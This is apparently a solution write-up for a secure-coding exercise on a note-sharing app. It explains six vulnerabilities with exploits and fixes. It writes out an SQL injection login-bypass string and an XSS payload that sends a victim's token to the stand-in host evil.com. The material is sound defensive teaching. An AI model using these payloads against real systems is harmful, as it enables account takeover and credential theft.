# Design Challenge 02 — Solution: Find the 5 Vulnerabilities

## Vulnerability 1: SQL Injection (Snippet 1 — login endpoint)

**What it is:** `email` and `password` are concatenated directly into the SQL string instead of being passed as parameters.

**Exploit:** An attacker submits `email = "' OR '1'='1' --"` and any password. The resulting query becomes:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = '...'
```
`'1'='1'` is always true and `--` comments out the rest of the query, so this returns the *first row* in the `users` table — logging the attacker in as whichever user that happens to be, with no valid credentials at all.

**Fix:** Use parameterized queries everywhere, with no exceptions:
```js
const result = await db.query(
  "SELECT * FROM users WHERE email = $1",
  [email]
);
// then compare `password` against a stored BCRYPT/ARGON2 HASH, never a plaintext column
```
This also surfaces vulnerability 2 below — passwords should never be stored or compared in plaintext in the first place.

---

## Vulnerability 2: Plaintext Password Storage

**What it is:** The query compares `password = '${password}'` directly against a database column — meaning passwords are stored in plaintext, not hashed.

**Exploit:** Any database access at all (a backup leak, an insider, the SQL injection above, or simply snippet 4's leaked credentials) exposes every user's actual password in cleartext — which, given password reuse across sites, compromises those users' accounts elsewhere too, not just on NoteShare.

**Fix:** Hash passwords with a slow, salted algorithm (bcrypt or Argon2) at signup, and compare the hash of the submitted password against the stored hash at login — never store or query on a raw password value.

---

## Vulnerability 3: Broken Object-Level Authorization (Snippet 2 — fetch a note)

**What it is:** `GET /notes/:id` fetches *any* note by ID with no check that the requesting user owns it or was shared it. There's not even an authentication check shown — the JWT is never verified or decoded in this handler at all.

**Exploit:** Any authenticated (or even unauthenticated) user can enumerate `/notes/1`, `/notes/2`, `/notes/3`, … and read every note in the system, including private notes never shared with them. This is OWASP's most common API vulnerability class for exactly this reason — it's an easy thing to forget on any individual endpoint.

**Fix:** Verify the JWT and extract `userId`, then scope the query: `SELECT * FROM notes WHERE id = $1 AND (owner_id = $2 OR id IN (SELECT note_id FROM shares WHERE shared_with = $2))`. As in the multi-tenant design challenge, this ownership check should live in a shared, mandatory data-access layer rather than being re-implemented (and potentially forgotten) per endpoint.

---

## Vulnerability 4: XSS via `dangerouslySetInnerHTML` (Snippet 3)

**What it is:** A note's `title` — arbitrary user input — is rendered as raw HTML via `dangerouslySetInnerHTML`, with no sanitization.

**Exploit:** A user sets their note's title to `<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))">`. Anyone who views that note (including via a shared link) executes this script in their own browser session, exfiltrating their JWT (which, recall, is stored in `localStorage`, not an `httpOnly` cookie — making it directly readable by any script that runs on the page) straight to the attacker, who can now impersonate that user for up to 30 days (the token's expiry).

**Fix:** Never use `dangerouslySetInnerHTML` for user-generated content; render `note.title` as plain text (`<div>{note.title}</div>`), which React escapes automatically. If rich text is genuinely required, sanitize through an allowlist-based HTML sanitizer before rendering, and add a strict Content-Security-Policy header as a second layer of defense.

---

## Vulnerability 5: Hardcoded Secrets Committed to the Repository (Snippet 4 + the JWT signing secret in Snippet 1)

**What it is:** Production database credentials are committed directly to the repo in `db.js`, and the JWT signing secret (`"supersecret123"`) is hardcoded directly in source.

**Exploit:** Anyone with read access to the repository (including, if it's ever made public, forked, or leaked through a former employee's clone) has the production database password and can connect directly — bypassing the application, its authorization logic, and any audit logging entirely. The hardcoded JWT secret is just as bad: anyone who has it can forge a valid token for *any* `userId` without ever logging in, completely defeating authentication.

**Fix:** Move both into a secrets manager (environment variables at minimum; Vault or a cloud provider's secrets manager for rotation and audit trail, per the [deep dive](../../02-deep-dive/README.md)) and rotate both immediately, since they must be treated as already compromised once committed to version control history (removing them from the latest commit is not sufficient — history must be scrubbed or the credentials rotated).

---

## Bonus Vulnerability 6: Permissive CORS with Credentials (Snippet 5)

**What it is:** `origin: "*"` combined with `credentials: true` allows any website on the internet to make authenticated, credentialed requests to the NoteShare API from a user's browser.

**Exploit:** An attacker hosts a malicious page that issues a `fetch()` to `noteshare.com/notes/...` from a logged-in victim's browser; with `credentials: true` and a wildcard origin (which browsers will in practice refuse to combine for cookie-based auth, but many proxy/server misconfigurations effectively replicate this risk via reflected origins), the attacker's site can read responses meant only for the legitimate frontend. Combined with vulnerability 3 above, this expands the blast radius of the missing authorization check to any third-party site, not just direct API callers.

**Fix:** Set `origin` to an explicit allowlist of your own frontend's domain(s), never a wildcard when `credentials: true` is set.

---

## Summary Table

| # | Vulnerability | Class | Severity |
|---|---|---|---|
| 1 | String-concatenated SQL in login | SQL Injection | Critical — full auth bypass |
| 2 | Plaintext password storage | Insecure credential storage | Critical — mass account compromise on any data exposure |
| 3 | No ownership check on `/notes/:id` | Broken object-level authorization | Critical — reads any user's private data |
| 4 | Unsanitized HTML render of note title | XSS | High — session/token theft |
| 5 | Hardcoded DB password + JWT secret in source | Secrets management failure | Critical — full system compromise if repo leaks |
| 6 (bonus) | Wildcard CORS with credentials | Misconfigured CORS | Medium–High — amplifies vulnerability 3's blast radius |
